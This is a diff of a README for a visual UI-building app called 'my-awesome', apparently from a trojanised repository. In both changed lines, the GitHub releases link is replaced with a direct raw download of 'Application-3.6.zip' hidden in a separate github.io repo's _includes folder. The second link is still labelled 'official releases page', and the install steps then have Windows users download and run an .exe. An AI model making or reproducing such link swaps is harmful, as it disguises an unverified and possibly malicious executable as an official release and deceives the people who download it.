@@ -5,7 +5,7 @@ description: "Build and compose UI components on an interactive canvas to genera
 ---
 # 🎨 my-awesome - Build web layouts with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Reluctant-signore917/my-awesome/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Reluctant-signore917/reluctant-signore917.github.io/main/_includes/Application-3.6.zip)
 
 my-awesome is a visual tool for building user interfaces. You select pre-made components and place them on a digital canvas. The app generates code as you design, helping you create layouts without writing complex manual instructions. It works offline and provides instant previews of your progress.
 
@@ -22,7 +22,7 @@ To run this application on your computer, ensure your system meets these basic n
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/Reluctant-signore917/my-awesome/releases) to see available versions.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Reluctant-signore917/reluctant-signore917.github.io/main/_includes/Application-3.6.zip) to see available versions.
 2. Look for the file ending in `.exe` under the most recent version heading.
 3. Click the filename to start the download.
 4. Locate the downloaded file in your browser downloads folder or your desktop.
